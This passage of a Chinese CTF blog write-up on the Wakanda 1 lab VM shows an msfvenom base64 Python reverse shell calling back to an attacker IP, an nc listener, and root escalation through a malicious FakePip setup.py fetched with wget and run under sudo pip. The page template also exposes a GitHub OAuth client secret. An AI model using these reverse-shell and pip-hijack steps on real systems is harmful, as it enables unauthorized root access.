+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom -p cmd/unix/reverse_python lhost=192.168.56.1 lport=7788 formats py R</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span><br><span class="line">[-] No arch selected, selecting arch: cmd from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 537 bytes</span><br><span class="line">python -c <span class="string">"exec('aW1wb3J0IHNvY2tldCwgICAgICBzdWJwcm9jZXNzLCAgICAgIG9zICAgIDsgICAgICAgICBob3N0PSIxOTIuMTY4LjU2LjEiICAgIDsgICAgICAgICBwb3J0PTc3ODggICAgOyAgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgIDsgICAgICAgICBzLmNvbm5lY3QoKGhvc3QsICAgICAgcG9ydCkpICAgIDsgICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksICAgICAgMCkgICAgOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgICAgICAxKSAgICA7ICAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAgICAgIDIpICAgIDsgICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik='.decode('base64'))"</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>经过漫长的等待，shell终于弹回来了。第二个Flag到手。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nc -lvp 7788</span><br><span class="line">Connection from 192.168.56.101:50517</span><br><span class="line">id</span><br><span class="line">uid=1001(devops) gid=1002(developer) groups=1002(developer)</span><br><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line">devops@Wakanda1:/$ <span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">devops@Wakanda1:~$ ls</span><br><span class="line">ls</span><br><span class="line">flag2.txt</span><br><span class="line"></span><br><span class="line">devops@Wakanda1:~$ cat flag2.txt</span><br><span class="line">cat flag2.txt</span><br><span class="line">Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</span><br><span class="line">devops@Wakanda1:~$</span><br></pre></td></tr></table></figure>
+<h3 id="FakePip提权"><a href="#FakePip提权" class="headerlink" title="FakePip提权"></a>FakePip提权</h3><ul>
+<li>pip可以用sudo而且不用输入密码。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">devops@Wakanda1:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> devops on Wakanda1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User devops may run the following commands on Wakanda1:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/pip</span><br><span class="line">devops@Wakanda1:~$</span><br></pre></td></tr></table></figure>
+<ul>
+<li>项目地址：<a href="https://github.com/0x00-0x00/FakePip" target="_blank" rel="noopener">点我</a>，打开setup.py文件把里面的IP改了就可以了。项目里也有详细的教程。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  FakePip git:(master) ✗ php -S 0.0.0.0:4444</span><br><span class="line">PHP 7.2.10 Development Server started at Tue Oct 16 21:40:47 2018</span><br><span class="line">Listening on http://0.0.0.0:4444</span><br><span class="line">Document root is /home/kali-team/GitHub/FakePip</span><br><span class="line">Press Ctrl-C to quit.</span><br><span class="line">[Tue Oct 16 21:41:37 2018] 192.168.56.101:45377 [200]: /setup.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">devops@Wakanda1:~$ wget http://192.168.56.1:4444/setup.py</span><br><span class="line">wget http://192.168.56.1:4444/setup.py</span><br><span class="line">--2018-10-16 09:41:36--  http://192.168.56.1:4444/setup.py</span><br><span class="line">Connecting to 192.168.56.1:4444... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 990 [application/octet-stream]</span><br><span class="line">Saving to: ‘setup.py’</span><br><span class="line"></span><br><span class="line">setup.py            100%[=====================&gt;]     990  --.-KB/s   <span class="keyword">in</span> 0s     </span><br><span class="line"></span><br><span class="line">2018-10-16 09:41:36 (81.4 MB/s) - ‘setup.py’ saved [990/990]</span><br><span class="line"></span><br><span class="line">devops@Wakanda1:~$ ls</span><br><span class="line">ls</span><br><span class="line">flag2.txt  setup.py</span><br></pre></td></tr></table></figure>
+<ul>
+<li>按照项目教程执行pip安装，再用nc监听等shell。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">devops@Wakanda1:~$ sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br><span class="line">sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br><span class="line">Unpacking /home/devops</span><br><span class="line">  Running setup.py (path:/tmp/pip-SfNBak-build/setup.py) egg_info <span class="keyword">for</span> package from file:///home/devops</span><br><span class="line">    </span><br><span class="line">Installing collected packages: FakePip</span><br><span class="line">  Found existing installation: FakePip 0.0.1</span><br><span class="line">    Uninstalling FakePip:</span><br><span class="line">      Successfully uninstalled FakePip</span><br><span class="line">  Running setup.py install <span class="keyword">for</span> FakePip</span><br></pre></td></tr></table></figure>
+<ul>
+<li>root的Flag到手。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">➜  FakePip git:(master) ✗ nc -lvp 6666</span><br><span class="line">Connection from 192.168.56.101:46577</span><br><span class="line">root@Wakanda1:/tmp/pip-SfNBak-build<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@Wakanda1:/tmp/pip-SfNBak-build<span class="comment"># cd    	</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">root@Wakanda1:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@Wakanda1:~<span class="comment"># cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line"> _    _.--.____.--._</span><br><span class="line">( )=.-<span class="string">":;:;:;;':;:;:;"</span>-._</span><br><span class="line"> \\\:;:;:;:;:;;:;::;:;:;:\</span><br><span class="line">  \\\:;:;:;:;:;;:;:;:;:;:;\</span><br><span class="line">   \\\:;::;:;:;:;:;::;:;:;:\</span><br><span class="line">    \\\:;:;:;:;:;;:;::;:;:;:\</span><br><span class="line">     \\\:;::;:;:;:;:;::;:;:;:\</span><br><span class="line">      \\\;;:;:_:--:_:_:--:_;:;\</span><br><span class="line">       \\\_.-<span class="string">"             "</span>-._\</span><br><span class="line">        \\</span><br><span class="line">         \\</span><br><span class="line">          \\</span><br><span class="line">           \\ Wakanda 1 - by @xMagass</span><br><span class="line">            \\</span><br><span class="line">             \\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations You are Root!</span><br><span class="line"></span><br><span class="line">821ae63dbe0c573eff8b69d451fb21bc</span><br><span class="line"></span><br><span class="line">root@Wakanda1:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+    </div>
+    <p class="post-meta">
+        <span class="post-cat">分类：
+            <a class="cat-link" href="/categories/CTF/">CTF</a>
+        </span>
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/CTF/" title="CTF">CTF</a>
+    
+
+        </span>
+    </p>
+</article>
+<!-- 分享按钮 -->
+
+
+<!-- 上一篇/下一篇 -->
+
+<div class="article-nav clearfix">
+    
+    <span class="prev fl">
+        上一篇<br>
+        <a href="/2018/10/25/Write-up-Bulldog2/">
+            
+                Write-up-Bulldog2
+            
+        </a>
+    </span>
+    
+
+    
+    <span class="next fr">
+        下一篇<br>
+        <a href="/2018/10/12/Write-up-NODE-1/">
+            
+                Write-up-NODE-1
+            
+        </a>
+    </span>
+    
+</div>
+
+<!-- 文章评论 -->
+
+  <script src="/js/comment.js"></script>
+  <div id="comments" class="comment">
+    <!--
+    <div class="sign-bar">
+      GitHub 已登录!
+      <span class="sign-link">登出</span>
+    </div>
+    <section class="box">
+      <div class="com-avatar"><img src="/img/favicon.ico" alt="avatar"></div>
+      <div class="com-text">
+        <div class="main">
+          <textarea class="text-area-edited show" placeholder="欢迎评论！"></textarea>
+          <div class="text-area-preview"></div>
+        </div>
+        <div class="switch">
+          <div class="switch-item on">编辑</div>
+          <div class="switch-item">预览</div>
+        </div>
+        <div class="button">提交</div>
+      </div>
+    </section>
+    <section class="tips">注：评论支持 markdown 语法！</section>
+    <section class="list-wrap">
+      <ul class="list">
+        <li>
+          <div class="user-avatar">
+            <a href="/">
+              <img src="/img/favicon.ico" alt="user-avatar">
+            </a>
+          </div>
+          <div class="user-comment">
+            <div class="user-comment-header">
+              <span class="post-name">张德龙</span>
+              <span class="post-time">2017年12月12日</span>
+              <span class="like liked">已赞</span>
+              <span class="like-num">2</span>
+            </div>
+            <div class="user-comment-body">333333</div>
+          </div>
+        </li>
+        <li>
+          <div class="user-avatar">
+            <a href="/">
+              <img src="/img/favicon.ico" alt="user-avatar">
+            </a>
+          </div>
+          <div class="user-comment">
+            <div class="user-comment-header">
+              <span class="post-name">刘德华</span>
+              <span class="post-time">2017年12月12日</span>
+              <span class="like">点赞</span>
+              <span class="like-num">2</span>
+            </div>
+            <div class="user-comment-body">vvvvv</div>
+          </div>
+        </li>
+      </ul>
+      <div class="page-nav">
+        <a href="javascript: void(0);" class="item">1</a>
+        <a href="javascript: void(0);" class="item">2</a>
+        <a href="javascript: void(0);" class="item current">3</a>
+      </div>
+    </section>
+    -->
+  </div>
+  <script>
+  JELON.Comment({
+    container: 'comments',
+    label: 'Write-up-wakanda-1' || '2018/10/16/Write-up-wakanda-1/',
+    owner: 'cn-kali-team',
+    repo: 'cn-kali-team.github.io',
+    clientId: '0683bca9d762208912a9',
+    clientSecret: 'fd3e06918ff647fd4b347dfeba033b588a957fc5'
+  });
+  </script>
+
+
+            </div>
+
+        </section>
+        <!-- 侧栏部分 -->
+<aside class="sidebar">
+    <section class="widget">
+        <h3 class="widget-hd"><strong>文章分类</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+    <li>
+        <a href="/categories/Arch/">Arch</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/工具/">工具</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/漏洞复现/">漏洞复现</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/CTF/">CTF</a>
+        <span class="badge">(11)</span>
+    </li>
+    
+    <li>
+        <a href="/categories/Web/">Web</a>
+        <span class="badge">(1)</span>
+    </li>
+    
+</ul>
+    </section>
+
+    
+    <section class="widget">
+        <h3 class="widget-hd"><strong>热门标签</strong></h3>
+        <!-- 文章标签 -->
+<div class="widget-bd tag-wrap">
+  
+    <a class="tag-item" href="/tags/Arch/" title="Arch">Arch (1)</a>
+  
+    <a class="tag-item" href="/tags/Genymotion/" title="Genymotion">Genymotion (1)</a>
+  
+    <a class="tag-item" href="/tags/漏洞复现/" title="漏洞复现">漏洞复现 (1)</a>
+  
+    <a class="tag-item" href="/tags/CTF/" title="CTF">CTF (11)</a>
+  
+    <a class="tag-item" href="/tags/XSS/" title="XSS">XSS (1)</a>
+  
+    <a class="tag-item" href="/tags/web/" title="web">web (1)</a>
+  
+    <a class="tag-item" href="/tags/Linux/" title="Linux">Linux (1)</a>
+  
+    <a class="tag-item" href="/tags/nmap/" title="nmap">nmap (1)</a>
+  
+    <a class="tag-item" href="/tags/metasploit/" title="metasploit">metasploit (1)</a>
+  
+</div>
+    </section>
+    
+
+    
+
+    
+    <!-- 友情链接 -->
+    <section class="widget">
+        <h3 class="widget-hd"><strong>友情链接</strong></h3>
+        <!-- 文章分类 -->
+<ul class="widget-bd">
+    
+        <li>
+            <a href="https://gh0st.cn/" target="_blank" title="陈的博客">VulKey</a>
+        </li>
+    
+        <li>
+            <a href="https://10miaomiao.cn/" target="_blank" title="10喵喵的世界">飞跃</a>
+        </li>
+    
+        <li>
+            <a href="http://www.zmnihao.cn/" target="_blank" title="梓铭你好">梓铭</a>
+        </li>
+    
+</ul>
+    </section>
+    
+</aside>
+<!-- / 侧栏部分 -->
+    </div>
+
+    <!-- 博客底部 -->
+    <footer class="footer">
+    &copy;
+    
+        2016-2019
+    
+</footer>
+<div class="back-to-top" id="JELON__backToTop" title="返回顶部">返回顶部</div>
+
+    <!--博客js脚本 -->
+    <!-- 这里放网站js脚本 -->
+<script src="/js/main.js"></script>
+</body>
+</html>
